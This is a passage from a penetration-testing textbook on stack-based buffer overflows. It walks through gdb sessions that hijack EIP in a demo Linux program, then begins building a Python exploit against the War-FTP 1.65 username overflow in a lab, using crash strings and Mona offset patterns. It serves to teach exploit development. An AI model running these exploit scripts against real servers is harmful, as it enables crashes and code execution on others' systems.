(gdb) x/16xw $esp
0xbffff500: 0xb7f93849 0x08049ff4 0xbffff518 0x080482e8
0xbffff510: 0xb7fcfff4 0x08049ff4 0xbffff528 0x08048443u
0xbffff520: 0xbffff735 0xbffff540 0xbffff598 0xb7e8c685
0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685
(gdb) x/1xw $ebp
0xbffff518: 0xbffff528
A Stack-Based Buffer Overflow in Linux 373
(gdb) continue
Continuing.
Listing 16-10: Examining memory at breakpoint 2
You can see here that function1‚Äôs stack frame has also moved up 32 bytes. 
Also note that our return address still holds the memory address 0x08048443 u. 
Though our stack frame has moved around a bit, the instructions in memory to be executed are in the same place. 
Use the continue command again to move on to the third breakpoint. 
This is where things get interesting, as shown in Listing 16-11.
Breakpoint 3, function (str=0x41414141 <Address 0x41414141 out of bounds>)
 at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff500: 0xbffff513 0xbffff733 0xbffff518 0x080482e8
0xbffff510: 0x41fcfff4 0x41414141 0x41414141 0x41414141ÔÇå
0xbffff520: 0x41414141 0x41414141 0x41414141 0x41414141
0xbffff530: 0x08040041 0x08048340 0xbffff598 0xb7e8c685
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
Listing 16-11: Return address overwritten by As
Let‚Äôs examine the memory again at our third breakpoint, directly after 
strcpy but before function1 returns to main. This time, not only is the return 
address overwritten by As at u but part of main‚Äôs stack frame is overwritten 
as well. At this point, there is no hope for the program to recover. 
When function1 returns, the program attempts to execute the instructions at the return address for main, but the return address has been overwritten with our As, causing the expected segmentation fault when trying 
to execute the instruction at the memory address 41414141. (In the coming 
sections, we‚Äôll discuss replacing the return address with something that 
redirects the program to code of our own instead of crashing it.)
Controlling EIP 
Making the program crash is interesting in and of itself, but as exploit 
developers, our goal is to hijack execution if possible and get the target 
CPU to execute code on our behalf. Perhaps by manipulating the crash, we 
can execute other instructions that the developer never intended.
Currently, our program crashes when it tries to execute the instructions 
at the memory address 41414141, which is out of bounds. We need to change 
our argument string to include a valid memory address that our program 
can access. If we can replace the return address with another valid memory 
location, we should be able to hijack execution when function1 returns. 
374 Chapter 16
Perhaps the developer even left some debugging code in the program that we 
can use to illustrate this purpose. (But I‚Äôm getting a bit ahead of myself here.)
To redirect execution, we first need to determine where the return 
address is overwritten by our long string of As. Let‚Äôs look back at what our 
stack looked like when we ran our program normally with only four characters for our argument, as shown here.
0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8
0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500v 0x08048443w
We can see where the four As u were copied into the local variable, 
buffer. Now, recall that the four bytes directly after EBP v contain the return 
address 0x08048443 w. We can see that after the four As, there are five more 
bytes in function1‚Äôs stack frame, which come before the return address. 
Looking at memory, it stands to reason that if we give our program an 
argument that is 5 + 4 + 4 bytes long, the last four bytes will overwrite the 
return address. We can test this by sending our program an argument of 
nine As followed by four Bs. If our program crashes when trying to execute 
the instruction at memory address 42424242 (the hexadecimal representation of B), we‚Äôll know we have calculated our offset correctly. 
We can use Perl again to help us create our argument string, as shown in 
Listing 16-12. 
(gdb) delete 1
(gdb) delete 2
(gdb) run $(perl -e 'print "A" x 9 . "B" x 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "B" x 4')
Listing 16-12: Starting the program with a new attack string 
Before we run the program with this new argument, delete the first two 
breakpoints because the state of memory won‚Äôt change in an interesting way 
until our third breakpoint, after strcpy is executed. 
Start the program using Perl, with nine As followed by four Bs as the 
attack string. Because the program crashed on its last run, you will be 
asked if you would like to start from the beginning. Enter y for yes. When 
we examine memory at our only remaining breakpoint, everything looks 
as predicted, as shown in Listing 16-13.
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 } 
(gdb) x/20xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x42424242u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
0xbffff550: 0x00000002 0xbffff5d4 0xbffff5e0 0xb7fe2b38
(gdb) continue
A Stack-Based Buffer Overflow in Linux 375
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
Listing 16-13: Overwriting the return address with Bs
Where we previously saw our return address (0x08048443), we now have 
0x42424242. If we let the program continue, we can see that it crashes while 
trying to execute the memory address of four Bs u. This is once again out 
of bounds, but at least now we know where to place the address of the code 
we want to execute. 
We have now pinpointed which four bytes in our attack string overwrite 
the return address. Remember that the return address is loaded into EIP 
when function1 returns. Now we just need to find somewhere more interesting to send execution than 41414141 or 42424242. 
Hijacking Execution
We‚Äôve determined where to overwrite the return address in our argument 
string, but we still need something to put there. (This example may seem 
a bit contrived compared to the rest of the exploit development examples 
we‚Äôll cover, but it illustrates the underlying concepts well.) We‚Äôve managed to 
manipulate an issue with the strcpy function used by the program to break 
out of the buffer variable and overwrite additional memory addresses, 
including the return address. 
Looking back at our source code for overflowtest.c, recall the program 
contains another function in addition to main and function1. The first function 
in the program, called overflowed, prints ‚ÄúExecution Hijacked‚Äù out to the console and then returns. This extra function is never called when the program 
runs normally, but as its output implies, we can use it to hijack execution. 
Returning to our debugger, if we can find the start of overflowed in memory, we should be able to replace our four Bs with that memory address, overwrite the return address, and force the program to execute instructions the 
developers didn‚Äôt intend it to. We have the source code and know the function 
name we are looking for, so this task is trivial. Let‚Äôs just disassemble overflowed
and find out where it is loaded in memory, as shown in Listing 16-14.
(gdb) disass overflowed
Dump of assembler code for function overflowed:
u 0x080483f4 <overflowed+0>: push %ebp
0x080483f5 <overflowed+1>: mov %esp,%ebp
0x080483f7 <overflowed+3>: sub $0x8,%esp
0x080483fa <overflowed+6>: movl $0x8048520,(%esp)
0x08048401 <overflowed+13>: call 0x804832c <puts@plt>
0x08048406 <overflowed+18>: leave 
0x08048407 <overflowed+19>: ret 
End of assembler dump.
(gdb) 
Listing 16-14: Disassembling overflowed
376 Chapter 16
As you can see, the memory address 0x80483f4 u holds the first instruction of overflowed. If we redirect our program here, it will execute all the 
instructions in that function. 
N ote This won‚Äôt give us a reverse shell or join the target to a botnet; it will only print out
‚ÄúExecution Hijacked‚Äù to the screen. We will look at more exciting execution hijacks in 
the exploit development examples in the next three chapters.
We can use Perl to help us create our argument string, which will 
include hexadecimal bytes for the memory address we want to use to overwrite the return address, as shown here.
(gdb) run $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
This time, we replace our four Bs with \x08\x04\x83\xf4, which should 
redirect execution to the beginning of overflowed. But things don‚Äôt work out 
as planned, as shown in Listing 16-15. 
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0xf4830408u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xf4830408 in ?? ()
Listing 16-15: The return address bytes are flipped. 
As you can see, we hit our breakpoint as expected, but when we examine memory, we seem to have a little problem. The memory address of the 
first instruction in overflowed is 0x80483f4, but the return address on our stack 
is 0xf4830408 u. The digits aren‚Äôt entirely reversed, but the bytes are in the 
wrong order. 
Recall that two hexadecimal digits make up one byte. When we let the 
program continue, we receive another access violation for trying to execute 
data at 0xf4830408. We know that the program crashes because the new 
return address is wrong, so let‚Äôs look at how those bytes wound up out of 
order in the first place so we can fix the problem.
Endianness
When I was first learning basic exploit development, I spent many hours 
scratching my head and wondering what could possibly be keeping my exploit 
from working. I had run into this same problem, and unfortunately, I hadn‚Äôt 
been paying attention in operating systems class when we covered endianness. 
A Stack-Based Buffer Overflow in Linux 377
In the 1726 novel Gulliver‚Äôs Travels, Jonathan Swift‚Äôs titular character 
is shipwrecked on the island of Lilliput. Lilliput is currently on bad terms 
with neighboring Blefuscu because of a dispute about how to properly crack 
an egg. In Lilliput, eggs are cracked at the little end, and in Blefuscu, eggs 
are cracked at the big end. We have a similar dispute in computer science 
regarding byte order. Big endians believe that the most significant byte 
should be stored first, whereas little endians store the least significant byte 
first. Our Ubuntu virtual machine has an Intel architecture, which is little 
endian. To account for little-endian architecture, we need to flip the bytes 
of our memory address around, as shown here.
(gdb) run $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
Using the return address \xf4\x83\x04\x08 with the byte order flipped 
for our Intel architecture fixes our problem, as shown in Listing 16-16.
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x080483f4
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
(gdb) continue
Continuing.
Execution Hijacked u
Program received signal SIGSEGV, Segmentation fault.
0xbffff700 in ?? ()
(gdb) 
Listing 16-16: Successfully hijacking execution 
This time when we hit the breakpoint, our return address looks correct. 
Sure enough, when we let the program continue, ‚ÄúExecution Hijacked‚Äù is 
printed to the console at u, meaning we have successfully hijacked execution and exploited a buffer overflow vulnerability. 
To see the results outside the debugger, we run overflowtest from the 
command line with an argument that includes the new return address, as 
shown here.
georgia@ubuntu:~$ ./overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
Execution Hijacked
Segmentation fault
378 Chapter 16
Note that after overflowed returns, the program crashes with a segmentation fault when executing the memory address bffff700. This address is 
the same as the next four bytes on the stack after our return address. And 
thinking back to how memory works, this makes sense, but our ‚Äúmalicious‚Äù 
code was fully executed prior to the crash. After the stack frame for overflowed
is popped off the stack, bffff700 appears to be in the place of the return 
address. We sent execution straight to overflowed without normal functioncalling things like saving a return address. When overflowed‚Äôs stack frame is 
unwound from the stack, the next memory address of the stack is assumed 
to be the return address, but this is just part of main‚Äôs stack frame, so we crash. 
How might you augment your attack string to fix this? You guessed it: 
You could add another four bytes to our attack string, sending execution 
back to the original return address in main. Because we have corrupted 
main‚Äôs stack frame, we may still run into trouble down the line, but we can 
meet our goal of tricking the program into executing code on our behalf.
Summar
In this chapter we looked at a simple C program with a buffer overflow 
vulnerability (namely the use of the insecure strcpy function) that does not 
check its array boundaries, which allows us to write to adjacent memory. We 
exploited this issue by writing a longer string to the command line than the 
program expected. We hijacked the program‚Äôs execution by overwriting a 
function‚Äôs return address with our own value. We sent execution to another 
function included in the original program. 
Now that you‚Äôve seen a basic example of a stack-based overflow, let‚Äôs 
move on to something a bit more complex. In the next chapter, our example 
will focus on a Windows-based target and a real-world target program. 
17
AS t ack-Bae d Buf f 
Ov erfl ow i W i n do 
In this chapter, we will look at exploiting a stack-based 
buffer overflow in an older version of a Windows-based 
FTP server. As we did in Chapter 16, we will attempt 
to overwrite the return pointer saved onto the stack 
when a function is called, as shown earlier in Figure 16-3 on page 364. 
When the function main calls function1, the next instruction to be executed is 
saved on the stack, and a stack frame for function1 is added to the stack. 
The size of function1‚Äôs local variables is determined when the application is compiled and fixed. The amount of space ‚Äúreserved‚Äù on the stack for 
these local variables is fixed, too. This reservation is called a stack buffer. If we 
put more data in the stack buffer than it can hold, we will cause the buffer 
to overflow. Then we may be able to overwrite the saved return address, 
which is placed after the stack buffer, and take control of program execution. (For a more detailed review of this process, see Chapter 16.)
In Chapter 1, we installed War-FTP version 1.65 on the Windows XP target, but we didn‚Äôt start it. We have exploited the FileZilla FTP server in previous chapters, and if you‚Äôve been following along, that FTP server is still 
380 Chapter 17
running. Before we can use War-FTP, we need to stop 
the FileZilla FTP server using the XAMPP control panel. 
This will open TCP port 21 for War-FTP. Open WarFTP on the Windows XP desktop by double clicking 
its icon (see Figure 17-1), and click the lightning bolt 
in the top-left corner of the War-FTP window to put it 
online (see Figure 17-2).
Searching for a Known Vulnerability in War
A search on Google for known vulnerabilities in War-FTP 1.65 finds the following information on SecurityFocus.com: 
War-FTP Username Stack-Based Buffer-Overflow Vulnerability
War-FTP is prone to a stack-based buffer-overflow vulnerability 
because it fails to properly check boundaries on user-supplied 
data before copying it to an insufficiently sized buffer.
Exploiting this issue could lead to denial-of-service conditions 
and to the execution of arbitrary machine code in the context of 
the application.
In Chapter 16, we overflowed a function‚Äôs local variable on the stack 
with supplied input and redirected execution to a memory location of our 
choosing. Based on this information from SecurityFocus.com, it looks like we 
can do something similar with War-FTP 1.65. In this chapter, we will manually exploit War-FTP 1.65‚Äôs stack-based buffer overflow vulnerability in the 
Username field of the FTP login. Now that we are using a real program 
rather than demo code, we will learn more about writing real exploits. For 
example, this time we won‚Äôt be able to simply redirect execution to another 
function; we will instead need to introduce instructions to be executed as 
part of our attack string. 
To get started, make sure War-FTP 1.65 is open and running on your Windows XP virtual machine. (The lightning bolt icon in the top-left corner of the 
GUI shown in Figure 17-2 tells the server to listen for incoming connections.)
The issue we are going to exploit is particularly dangerous because 
an attacker does not need to log in to the FTP server before launching an 
attack. Thus, we do not need to add any legitimate users to the FTP server 
for this attack to work. 
Before we dive in and start trying to exploit War-FTP, let‚Äôs hook it 
up to a debugger. Immunity Debugger should be on the desktop of your 
Windows XP target because we installed it in Chapter 1. If it is not, follow 
the instructions in Chapter 1 for setting up Immunity Debugger and the 
Mona plugin. Like GDB, Immunity Debugger will allow us to see the internals of memory as we attempt to exploit War-FTP. Unfortunately, we don‚Äôt 
have source code to guide us toward a successful exploit, but by watching 
our program in memory as we send it attack strings, we should still be able 
to develop a working exploit. 
Figure 17-1: WarFTP icon
A Stack-Based Buffer Overflow in Windows 381
Figure 17-2: War-FTP 1.65 GUI
Start Immunity Debugger, open the File menu, and select Attach. We 
want to attach Immunity Debugger to the running War-FTP process, which 
we see in the process list in Figure 17-3. Highlight War-FTP 1.65, and click 
Attach. 
Figure 17-3: Process list in the Immunity Debugger interface
382 Chapter 17
When Immunity Debugger first attaches to a process, it pauses the process‚Äôs execution. If at any point your exploit just randomly stops working, 
check to make sure the process is running. A paused process isn‚Äôt listening 
for incoming connections, and, as you can see in the lower-right corner 
of the Immunity Debugger window in Figure 17-4, the process is paused. 
Click the Play button at the top-left corner of the screen to tell the process 
to continue running. 
Figure 17-4: War-FTP pauses in Immunity Debugger. 
With War-FTP running in Immunity Debugger, we can figure out how 
to exploit its buffer overflow vulnerability.
Causing a Crash
In Chapter 19, we will use a technique called fuzzing to look for potential 
vulnerabilities in programs, but for now, follow my lead on which attack 
strings to use to crash the program. In the Username field of the FTP login, 
let‚Äôs send a string of 1,100 As instead of a username. Rather than attacking 
our program locally, as we did in the previous example, this time we will 
A Stack-Based Buffer Overflow in Windows 383
create our exploit in Kali Linux and set up the exploit to talk to the FTP 
server over the network. Listing 17-1 shows a starter exploit that will cause 
the War-FTP program to crash.
N ote Our exploit examples are written in Python, but they can easily be ported into another
language if you‚Äôd prefer to use a different one.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
buffer = "A" * 1100 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) u
connect=s.connect(('192.168.20.10',21)) u
response = s.recv(1024)
print response v
s.send('USER ' + buffer + '\r\n') w
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-1: Python exploit to crash War-FTP
In the exploit shown in Listing 17-1, we first import the socket Python 
library. Next, we create a string called buffer, which contains 1,100 As, and 
set up a socket at u to connect to our Windows XP machine on port 21, 
where the War-FTP server is listening. Next, we accept and print out the 
FTP server‚Äôs banner to the screen at v. Our exploit then sends over the USER
command with 1,100 As w for the username in hopes of causing the FTP 
server to crash. 
If the server responds and asks for our password, the exploit is ready 
to finish the connection with the password, PASSWORD. However, if our 
exploit succeeds, it won‚Äôt matter if our credentials are valid, because the 
program will crash before it finishes the login process. Finally, we close our 
socket, and the exploit finishes. Make sure the Python script is executable 
with chmod +x, and run the exploit as shown here. 
root@kali:~# chmod +x ftpexploit 
root@kali:~# ./ftpexploit
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
220 Please enter your user name.
331 User name okay, Need password.
As with the previous example, we hope to overwrite the saved return 
address with a string of As and cause the program to crash. The War-FTP 
server sends over its welcome banner, prompts us for our username, and 
then asks for a password. Take a look at War-FTP in Immunity Debugger, 
as shown in Figure 17-5, to see if our exploit managed to cause a crash. 
384 Chapter 17
Figure 17-5: War-FTP crashes due to a buffer overflow.
After we run our exploit, we see that War-FTP is paused due to an access 
violation when attempting to execute an instruction at 41414141. Based on 
what we learned in the Linux buffer overflow example in Chapter 16, this 
result should seem familiar. A return address was overwritten by our long 
string of As, so when the function returned, 41414141 was loaded into the 
EIP register. The program attempted to execute the instructions at that 
memory location, which was out of bounds and caused a crash. 
Locating E
As with the previous example, we need to know which four As in our string 
are overwriting the return address. Unfortunately, 1,100 As is a bit more 
than the 30 we used in the previous chapter, so just counting in memory is 
more difficult in this case. Also, we can‚Äôt be sure if the first As we‚Äôre seeing 
on the stack are the first As sent as part of the exploit.
Traditionally, the next step would be to crash the program again with 
550 As followed by 550 Bs. If the program crashed with 41414141 in EIP, then 
the return address overwrite occurred in the first 550 bytes; if it crashed 
with 42424242 in EIP, the overwrite was in the second half. From there, the 
half of the string in question would be split into 275 As followed by 275 Bs. 
Slowly but surely, this method would narrow down the exact location. 
A Stack-Based Buffer Overflow in Windows 385
Generating a Cyclical Pattern to Determine Offset
Luckily, we can use Mona to generate a unique cyclic pattern to find the 
right four bytes for the return address overwrite in only one iteration. To 
use Mona for this task, enter !mona pattern_create with length 1100 as an 
argument at the bottom of the Immunity Debugger window, as shown in 
Figure 17-6.
Figure 17-6: Using pattern_create in Mona 
The 1,100-character cyclic pattern is written to the file C:\logs\war-ftpd\
pattern.txt, as shown in Listing 17-2. 
=============================================================================
 Output generated by mona.py v2.0, rev 451 - Immunity Debugger
 Corelan Team - https://www.corelan.be
=============================================================================
 OS : xp, release 5.1.2600
 Process being debugged : war-ftpd (pid 2416)
=============================================================================
 2015-11-10 11:03:32
=============================================================================
Pattern of 1100 bytes :
-----------------------
386 Chapter 17
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3
Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9
An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5
Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1
As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7
Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3
Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9
Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5
Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1
Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7
Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3
Bk4Bk5Bk
Listing 17-2: Output of the pattern_create command
We are going to replace the long string of As with the unique pattern 
shown in Listing 17-2. But before running the exploit again, we need to 
restart War-FTP from the previous crash. In Immunity Debugger, go to 
Debug4Restart, and then press the Play button and click the lightning 
bolt icon to tell War-FTP to listen on the network. (Follow these steps each 
time you need to restart War-FTP after a crash.) Alternatively, you can 
close Immunity Debugger, restart War-FTP manually, and attach to the new 
process in the debugger. Replace the value of the buffer in the exploit with 
the pattern from Listing 17-2, surrounded by quotation marks to make it a 
string in Python, as shown in Listing 17-3.
N ote If War-FTP refuses to restart with the error Unknown format for user database, fin
and delete the files FtpDaemon.dat and/or FtpDaemon.ini that were created on the 
desktop by War-FTP. This should fix the problem and War-FTP should start normally.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket 
u buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8
Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0
Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6
Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ap3Ar7Ar8
Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4
Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Ax2Ax3Ax4
Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0
Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7
Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3
Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9
Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5
Bk"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
A Stack-Based Buffer Overflow in Windows 387
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-3: Exploit with cyclic pattern 
Now run the exploit again with the generated pattern starting at u, 
replacing the 1,100 As.
root@kali:~# ./ftpexploit
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
220 Please enter your user name.
331 User name okay, Need password.
Having run our exploit with Metasploit‚Äôs pattern, look back at Immunity 
Debugger, as shown in Figure 17-7, to see what value is contained in EIP and 
to find out where in our attack string we overwrite the return address. 
Figure 17-7: Finding the return address overwrite
War-FTP has crashed again, but this time EIP contains four bytes of our 
generated pattern: 32714131. We can use Mona to determine where exactly in 
388 Chapter 17
the 1,100-character cyclic pattern the ASCII equivalent of 32714131 is. Enter 
!mona pattern_offset 32714131 to get just the offset, or enter !mona findmsp at the 
Immunity Debugger prompt, as shown in Figure 17-8, to have Mona perform 
additional analysis on all registers and on instances of the pattern in memory. 
Figure 17-8: Finding the pattern offsets in Mona 
Mona finds instances of the cyclic pattern in memory. The output of 
the command is written to C:\logs\war-ftpd\findmsp.txt. Part of the output is 
shown here. 
 EIP contains normal pattern : 0x32714131 (offset 485)
 ESP (0x00affd48) points at offset 493 in normal pattern (length 607)
 EDI (0x00affe48) points at offset 749 in normal pattern (length 351)
 EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
Verifying Offsets
According to Mona, our return address overwrite is 485 bytes into the attack 
string. We can verify this, as shown in Listing 17-4. 
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
A Stack-Based Buffer Overflow in Windows 389
u buffer = "A" * 485 + "B" * 4 + "C" * 611
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-4: Verifying the EIP offset 
Now we‚Äôll create an attack string that contains 485 As, 4 Bs, and 611 Cs as 
shown at u in Listing 17-4. With our new string in place, if EIP contains 
42424242 when the program crashes, we‚Äôll know we have found the correct four 
bytes for the return address. (Remember to restart War-FTP in Immunity 
Debugger before running the exploit again.) Now, check EIP, as shown in 
Figure 17-9.
As expected, War-FTP has crashed again, this time with 42424242 in EIP. 
This result confirms that we have found the location of the return address 
in our attack string. Next we need to find someplace to redirect execution 
and exploit this buffer overflow vulnerability. 
Figure 17-9: War-FTP crashes with EIP filled with Bs
390 Chapter 17
Hijacking Executi
In the exploit example discussed in Chapter 16, we sent execution to another 
function. Unfortunately, because we don‚Äôt have the source code of War-FTP 
to review for potentially interesting code, we‚Äôll use a more typical technique 
for exploit development this time. Instead of redirecting execution to somewhere else in the program, we will introduce our own instructions and 
redirect execution to part of our attack string. 
First, we need to find out if part of our attack string is easily accessible 
at the time of the crash. Look back at the output of the !mona findmsp command in C:\logs\warftp-d\findmsp.txt, as shown here. 
 EIP contains normal pattern : 0x32714131 (offset 485)
 ESP (0x00affd48) points at offset 493 in normal pattern (length 607)
 EDI (0x00affe48) points at offset 749 in normal pattern (length 351)
 EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
In addition to taking control of EIP, the registers ESP, EDI, and EBP 
also point to part of the attack string. In other words, our attack string 
decides the contents of these registers, and there‚Äôs nothing to stop us from 
replacing the part of the attack string (the Cs in our current crash) with 
useful instructions for the CPU to execute. 
We can see that ESP is at memory address 00AFFD48, while EBP is slightly 
higher in memory at address 00AFFDA0. EDI is at 00AFFE48. We could redirect 
execution to any of these locations, but with the lower address farther up 
the stack, we have a little more space for our instructions. 
N ote Also, note that ESP does not point directly to the beginning of our Cs. Our saved
return pointer overwrite is at byte 485 in the pattern, but ESP is at 493, eight bytes 
away (four bytes for the return address and four bytes of Cs). 
Right-click ESP in the top right of the Immunity Debugger window, 
and select Follow in Stack. The stack is shown in the bottom right of the 
Immunity Debugger window. Scroll up a few lines, as shown in Figure 17-10. 
Notice that the line above ESP also contains four Cs, and above that 
are four Bs for the return address. This tells us that we need to start our 
malicious instructions for the CPU to execute four bytes into our Cs in the 
attack string (because ESP is four bytes into the Cs); otherwise, the first 
four bytes of our shellcode will be missed. (This sort of scenario will come 
up frequently because these four Cs are caused by a calling convention and 
indicate that the function has cleaned-up arguments.)
N ote Calling conventions are a set of rules implemented in a compiler, describing how a
child function will receive arguments from its caller function. Some conventions will 
cause the caller function to remove the arguments from the stack, while others state 
that the child function must remove the arguments. The latter will cause one or more 
dwords (depending on the number of arguments) to be skipped on the stack automatically, as shown in Figure 17-10, as soon as the child function ends.
A Stack-Based Buffer Overflow in Windows 391
Figure 17-10: ESP controlled by the attack string 
Now we can just put 00AFFD48 into the return address, replace our Cs 
with shellcode, and we will have a complete exploit, right? Close, but not 
